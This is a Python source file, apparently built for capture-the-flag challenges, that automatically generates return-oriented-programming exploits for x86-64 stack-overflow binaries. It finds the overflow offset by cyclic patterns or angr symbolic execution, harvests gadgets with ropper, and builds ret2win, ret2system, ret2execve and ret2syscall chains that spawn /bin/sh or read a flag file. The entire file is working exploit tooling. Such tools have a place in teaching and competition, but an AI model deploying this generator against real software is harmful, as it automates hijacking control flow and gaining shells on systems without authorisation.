from pwn import *
import angr
import claripy
import subprocess
import os

class ROP:
    def __init__(self, analysis):
        self.analysis = analysis
        self.filename = analysis.binary
        self.offset = self.set_offset()
        self.e = ELF(self.filename)
        self.gadgets = []
        self.find_gadgets()
        self.libc = "/opt/libc.so.6"
    
    def build_exploit(self):
        payload = None
        if self.analysis.has_win():
            if self.analysis.win_has_args():
                payload = self.ret2win_with_args()
            else:
                payload = self.ret2win()
        elif self.analysis.has_execve():
            payload = self.ret2execve()
        elif self.analysis.has_system():
            payload = self.ret2system()
        elif self.analysis.has_syscall():
            payload = self.ret2syscall()

        return payload
    
    def set_offset(self):
        try:
            p = process(self.filename)
            p.sendline(cyclic(1024, n=8))
            p.wait()
            core = p.corefile
            p.close()
            os.remove(core.file.name)
            return cyclic_find(core.read(core.rsp, 8), n=8)
        except PwnlibException as e:
            return Get2overflow(self.filename).buf()

    def ret2win(self):
        payload = cyclic(self.offset)
        payload += p64(self.e.sym["win"])
        
        return payload
    
    def ret2win_with_args(self):
        payload = cyclic(self.offset)
        payload += self.satisfy_win()
        payload += self.realign()
        payload += p64(self.e.sym['win'])

        return payload

    def ret2execve(self):
        payload = cyclic(self.offset)
        payload += self.fill_reg("rdi", self.analysis.get_binsh())
        payload += self.fill_reg("rsi", 0)
        payload += self.fill_reg("rdx", 0)
        payload += p64(self.e.sym["execve"])

        return payload

    def ret2syscall(self):
        payload = cyclic(self.offset)
        payload += self.fill_reg("rax", 59)
        payload += self.fill_reg("rdi", self.analysis.get_binsh())
        payload += self.fill_reg("rsi", 0)
        payload += self.fill_reg("rdx", 0)
        payload += p64(self.get_syscall())
        
        return payload
    
    def ret2system(self):
        payload = cyclic(self.offset)
        if self.analysis.has_catflagtxt():
            payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
        elif self.analysis.has_binsh():
            payload += self.fill_reg("rdi", self.analysis.get_binsh())
        payload += self.fill_reg("rsi", 0)
        payload += p64(self.e.sym["system"])

        return payload

    def supporting_functions_here(self): # ---------------------------------------------
        print("example support function")

    def find_gadgets(self):
        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | grep 0x"
        raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
            self.gadgets.append(i.replace(" nop;", ""))

    def get_pops(self):
        pops = []
        for i in self.gadgets:
            pops.append(i) if "pop" in i else next
        return pops

    def num_pops(self, string):
        return string.count('pop')

    def reg_pos(self, reg, gad):
        out = []
        gad = gad.split(' ')
        registers = ['rax',
                     'rbx',
                     'rcx',
                     'rdx',
                     'rsi',
                     'rdi',
                     'rbp',
                     'rsp',
                     'r8',
                     'r9',
                     'r10',
                     'r11',
                     'r12',
                     'r13',
                     'r14',
                     'r15']
        for i in gad:
            if i.strip(';') in registers:
                out.append(i.strip(';'))
        return out.index(reg)

    
    def pop_reg(self, reg):
        for i in self.get_pops():
            if ': pop ' + reg + "; ret;" in i:
                return [i.split(":")[0], 1, self.reg_pos(reg, i)]
            elif "pop " + reg in i:
                return [i.split(":")[0], self.num_pops(i), self.reg_pos(reg, i)]


    def fill_reg(self, reg, val):
        if isinstance(val, int):
            val = p64(int(val))
        elif isinstance(val, str):
            val = val.encode('utf-8')
        chain = p64(int(self.pop_reg(reg)[0], 16))
        for i in range(self.pop_reg(reg)[1]):
            if i == (self.pop_reg(reg)[2]):
                chain += val
            else:
                chain += p64(0)
        return chain


    def get_syscall(self):
        for i in self.gadgets:
            if "syscall" in i:
                return int(i.split(":")[0], 16)
        return None
    
    def realign(self):
        return p64(self.analysis.get_fini())

    def satisfy_win(self):
        return self.fill_reg("rdi", int(self.analysis.get_win_arg(), 16))
    
    def get_primitives(self):
        for i in self.gadgets:
            if 'qword ptr [' in i and 'mov' in i:
                return i
        return None
    
    # 0th is write_mem, 1st is other adddr
    def get_primitive_regs(self):
        prim = self.get_primitives().split('mov qword ptr')[1].split(';')[0][2:].split(',')
        return [prim[0][:2], prim[1]]

    def one_gadget(self):
          return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', self.libc]).decode().split(' ')]

class Get2overflow:
    def __init__(s, binary):
        s.elf = context.binary =  ELF(binary)
        s.proj = angr.Project(binary)
        start_addr = s.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 1024
        s.symbolic_input = claripy.BVS("input", 8 * buff_size)
        s.symbolic_padding = None

        s.state = s.proj.factory.blank_state(
                addr=start_addr,
                stdin=s.symbolic_input
        )
        s.simgr = s.proj.factory.simgr(s.state, save_unconstrained=True)
        s.simgr.stashes["mem_corrupt"] = []

        s.simgr.explore(step_func=s.check_mem_corruption)

    def check_mem_corruption(s, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(s.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"AAAAAAAA")
                        s.symbolic_padding = stack_smash[:index]
                        simgr.stashes["mem_corrupt"].append(path)
                    except ValueError:
                        print("[-] Failed to get offset!")
                        sys.exit(-1)
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    def buf(s):
        return len(s.symbolic_padding)

